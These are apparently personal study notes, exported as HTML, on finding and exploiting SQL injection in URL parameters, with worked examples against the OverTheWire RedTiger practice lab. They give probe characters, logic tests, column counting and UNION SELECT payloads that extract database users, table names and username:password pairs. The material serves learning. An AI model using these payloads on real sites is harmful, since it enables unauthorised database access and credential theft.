<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Testing URLs</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># SQL Injection - Testing URLs</h1></strong><br />Sometimes SQL queries can be found in URLs.<br />For example:<br /><code>https://www.shopping.com/search.php?item=handbag</code><br /><br />Here a user has searched for a handbag.<br />This value - <code>handbag</code> - will be inserted into a SQL query to find all handbags within the database.<br /><code>SELECT * from available_items WHERE item_name = &quot;handbag&quot;</code><br /><br />Because the user&#39;s input - <code>handbag</code> - has been inserted into a SQL query, it&#39;s potentially vulnerable to SQL injection.<br />The exact syntax of testing URLs will vary depening on the database type.<br /><br />When injecting into URLs, you typically need to find a way to get the result of the SQL query back out.<br />The general order of testing is:<br />1. Test for injection<br />2. Find the number of colums<br />3. Find which columns get printed out to the site<br />4. Retrieve the data<br /><br /><strong><h2>## 1. Test for injection</h2></strong><br />The exact syntax of testing URLs will vary depening on the database type.<br /><br /><strong><h3>### Generic tests - Generate an error</h3></strong><br />The goal of these generic tests is to generate an error.<br />If you get a SQL error, there&#39;s potentially a SQL injection vulnerability there.<br /><code>&#39;<br />&#39;&#39;<br />%27<br />&quot;<br />&quot;&quot;<br />%22<br />#<br />%23<br />;<br />%3B<br />)<br />*<br />&amp;apos;</code><br /><br /><strong><h3>### Query types - String vs Numeric</h3></strong><br />There&#39;s 2 types of SQL query - strings and numeric.<br /><br />String query - <code>SELECT * FROM Table WHERE id = &#39;1&#39;;</code><br />Numeric query - <code>SELECT * FROM Table WHERE id = 1;</code><br /><br />The injection will differ depend on whether the web page is submitting a string query or a numeric query.<br />Use intuition + guesswork to figure out whether it&#39;s a string or numeric query. If you have no idea (probably the case) just test both.<br /><br /><strong>#### Testing strings</strong><code><br /></code>Given the query <code>SELECT * FROM Table WHERE id = &#39;1&#39;;<br />&#39;</code>   False<code><br />&#39;&#39;</code> True<code><br />&quot;</code>   False<code><br />&quot;&quot;</code> True<code><br />\</code>   False<code><br />\\</code> True<code><br /><br /></code><strong>#### Testing numbers</strong><code><br /></code>Given the query <code>SELECT * FROM Table WHERE id = 1;<br />AND 1</code> 	        True<code><br />AND 0</code> 	        False<code><br />AND true</code> 	    True<code><br />AND false</code> 	False<code><br />1-false</code> 	    Returns 1 if vulnerable<code><br />1-true</code> 	        Returns 0 if vulnerable<code><br />1*56</code> 	        Returns 56 if vulnerable<code><br />1*56</code> 	        Returns 1 if not vulnerable<br /><br /><strong>#### Multi encoding</strong><code><br />%%2727<br />%25%27<br /><br /></code><strong>#### Merging characters</strong><code><br />`+HERP<br />&#39;||&#39;DERP<br />&#39;+&#39;herp<br />&#39; &#39;DERP<br />&#39;%20&#39;HERP<br />&#39;%2B&#39;HERP<br /></code><br /><strong>#### Logic Testing</strong><code><br />page.asp?id=1 or 1=1 --</code> true<code><br />page.asp?id=1&#39; or 1=1 --</code> true<code><br />page.asp?id=1&quot; or 1=1 --</code> true<code><br />page.asp?id=1 and 1=2 --</code> false<code><br /></code><br /><strong>#### Weird Characters</strong><code><br />Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was<br />transformed into U+0022 QUOTATION MARK (&quot;)<br />Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was<br />transformed into U+0027 APOSTROPHE (&#39;)</code><br /><br /><strong><h2>## 2. Find the number of colums</h2></strong><br />To print data, you first you need to know the number of columns in the table.<br /><br /><strong><h3>### Using </h3></strong><strong><code><h3>order by</h3></code></strong><strong><h3> or </h3></strong><strong><code><h3>group by</h3></code></strong><br />order by and group by work differently, but both can be used to find the number of columns.<br /><br /><code>order by 1</code> means sort values in the 1st column<br /><code>order by 2</code> means sort values in the 2nd column<br /><br />Keep increasing order by N+1 and see if you get any errors.<br /><em>Example:</em><br /><code>order by 4</code> acts normal<br /><code>order by 5</code> returns an error. <br />Now know that there are 4 columns in the table.<br /><div class="codebox"><div class="codebox">#&nbsp;no&nbsp;error<br />https://redtiger.labs.overthewire.org/level1.php?cat=1&nbsp;order&nbsp;by&nbsp;4<br />#&nbsp;throws&nbsp;an&nbsp;error<br />https://redtiger.labs.overthewire.org/level1.php?cat=1&nbsp;order&nbsp;by&nbsp;5</div></div><br /><br />Nothing working?<br />Try adding a comment e.g. <code>#</code> to the end of the inject if nothing&#39;s working<br /><code>https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 5#</code><br /><br /><strong><h2>## 3. Find which columns get printed out to the site</h2></strong><br />You want to be able to read the data you&#39;re extracting.<br /><br /><strong><h3>### union select</h3></strong><br />For all the columns that exist, <code>union select</code> will return the numbers of the columns that are being outputted to the web page.<br /><br /><code>https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4</code><br /><br /><strong><h2>## 4. Retrieve data</h2></strong><br />Now you can start extracting data by outputting to the columns which get printed to the web page.<br />Refer here for more stuff (can be a bit complex) - <a href="https://websec.ca/kb/sql_injection">https://websec.ca/kb/sql_injection</a><br /><br /><div class="codebox"><div class="codebox">#&nbsp;Get&nbsp;username&nbsp;of&nbsp;the&nbsp;sql-user<br />https://redtiger.labs.overthewire.org/level1.php?cat=1&nbsp;union&nbsp;select&nbsp;1,2,user(),4<br /><br />#&nbsp;Get&nbsp;version&nbsp;of&nbsp;the&nbsp;database<br />https://redtiger.labs.overthewire.org/level1.php?cat=1&nbsp;union&nbsp;select&nbsp;1,2,version(),4<br /><br />#&nbsp;Get&nbsp;all&nbsp;tables<br />https://redtiger.labs.overthewire.org/level1.php?cat=1&nbsp;union&nbsp;select&nbsp;1,2,table_name,4&nbsp;from&nbsp;information_schema.tables<br /><br />#&nbsp;Get&nbsp;all&nbsp;columns&nbsp;from&nbsp;a&nbsp;specific&nbsp;table<br />https://redtiger.labs.overthewire.org/level1.php?cat=1&nbsp;union&nbsp;select&nbsp;1,2,column_name,4&nbsp;from&nbsp;information_schema.columns&nbsp;where&nbsp;table_name&nbsp;=&nbsp;&#39;users&#39;<br /><br />#&nbsp;Get&nbsp;username&nbsp;and&nbsp;password&nbsp;columns&nbsp;from&nbsp;the&nbsp;users&nbsp;table.&nbsp;<br />#&nbsp;0x3a&nbsp;means&nbsp;&#39;:&#39;&nbsp;-&nbsp;it&#39;s&nbsp;a&nbsp;a&nbsp;separator&nbsp;used&nbsp;between&nbsp;the&nbsp;username&nbsp;and&nbsp;the&nbsp;password<br />https://redtiger.labs.overthewire.org/level1.php?cat=1&nbsp;union&nbsp;select&nbsp;1,2,concat(name,0x3a,<br />password),4&nbsp;FROM&nbsp;users</div></div><br /><br /></div>
</body>
</html>
